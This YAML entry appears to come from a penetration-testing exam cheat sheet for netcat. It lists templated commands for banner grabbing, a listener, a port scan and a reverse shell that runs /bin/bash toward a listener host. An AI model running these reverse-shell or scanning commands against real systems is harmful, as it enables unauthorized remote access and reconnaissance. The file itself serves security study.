tool: nc
tags: [network, post, m11]
exam_hint: "Netcat — TCP/UDP connect, listen, port relay, banner grab"
docs:
  - "man:nc"

actions:
  - title: banner grab
    desc: Connect and read service banner
    command: "nc -nv {{ip}} {{port|80}}"

  - title: listen shell
    desc: Listen for incoming connection
    command: "nc -lvnp {{lport|4444}}"

  - title: reverse shell connect
    desc: Connect back to listener
    command: "nc {{lhost}} {{lport|4444}} -e /bin/bash"

  - title: port scan
    desc: Simple TCP port check
    command: "nc -zv {{ip}} {{port|1-1000}}"
